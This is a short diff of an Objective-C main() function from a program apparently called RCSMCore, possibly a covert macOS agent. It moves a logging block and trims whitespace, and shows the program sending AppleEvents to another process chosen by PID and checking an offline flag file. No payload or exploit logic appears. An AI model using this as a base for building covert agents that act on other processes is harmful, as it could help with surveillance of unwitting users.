@@ -23,10 +23,15 @@ int main (int argc, const char *argv[])
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
+#ifdef ENABLE_LOGGING
+  [RCSMLogger setComponent: @"core"];
+  infoLog(@"STARTING");
+#endif
+  
   // Fix for lion: AppleEvents only from unhidden proc
   if (argc > 1) 
     {
-      if (argv[2] && 
+      if (argv[2] &&
           (strncmp(argv[2], "-p", strlen("-p")) == 0)) 
         {
           pid_t pid = atoi(argv[3]);
@@ -39,18 +44,12 @@ int main (int argc, const char *argv[])
           lionSendEventToPid(pid);
 
           [pool release];
-
           exit(0);
         }
     }
   
   NSString *offlineFlagPath = [[NSString alloc] initWithFormat: @"%@/off.flg",
                                [[NSBundle mainBundle] bundlePath]];
-
-#ifdef ENABLE_LOGGING
-  [RCSMLogger setComponent: @"core"];
-  infoLog(@"STARTING");
-#endif
   
   gUtil = [RCSMUtils sharedInstance];
   RCSMCore *core = [[RCSMCore alloc] init];
